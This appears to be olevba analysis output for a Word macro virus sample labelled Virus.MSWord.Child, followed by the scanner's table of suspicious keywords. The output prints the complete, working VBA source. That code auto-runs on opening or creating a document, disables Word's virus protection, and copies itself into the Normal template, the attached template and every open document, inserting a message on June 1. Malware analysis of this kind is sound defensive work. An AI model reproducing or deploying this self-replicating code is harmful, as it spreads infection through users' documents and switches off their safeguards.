olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Child
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Child - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO do3A2N3H2T.bas 
in file: ./Virus.MSWord.Child - OLE stream: 'Macros/VBA/do3A2N3H2T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
    Call Main
End Sub

Sub AutoNew()
    Call Main
End Sub

Sub Main()
    'Not warning Virus Protection
    Application.Options.VirusProtection = False
    
    'Insert before active document if today is 06/01/yy
    If (Month(Date) = 6) And (Day(Date) = 1) Then
        msg = "Today is 06/01/" & Year(Date) & _
            ". So you must love all children around you. Thanks!"
        Application.ActiveDocument.Range(0, 0).InsertBefore msg
        Application.ActiveDocument.Range(0, Len(msg)).Bold = True
        Application.ActiveDocument.Range(0, Len(msg)).Italic = True
        Application.ActiveDocument.Range(0, Len(msg)).Underline = True
    End If
    
    On Error Resume Next
    
   'Normal Template
    If Application.NormalTemplate.FullName <> "" Then
        Application.OrganizerCopy Source:=ThisDocument.FullName, Destination:= _
            Application.NormalTemplate.FullName, Name:="do3A2N3H2T" _
            , Object:=wdOrganizerObjectProjectItems
    End If
    
    'Attached Template
    If ThisDocument.AttachedTemplate.FullName <> "" Then
        Application.OrganizerCopy Source:=ThisDocument.FullName, Destination:= _
            ThisDocument.AttachedTemplate.FullName, Name:="do3A2N3H2T" _
            , Object:=wdOrganizerObjectProjectItems
    End If
    
    'Search on all open documents
    Dim doc As Document
    For Each doc In Application.Documents
        Application.OrganizerCopy Source:=ThisDocument.FullName, Destination:= _
            doc.FullName, Name:="do3A2N3H2T" _
            , Object:=wdOrganizerObjectProjectItems
    Next
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|open                |May open a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

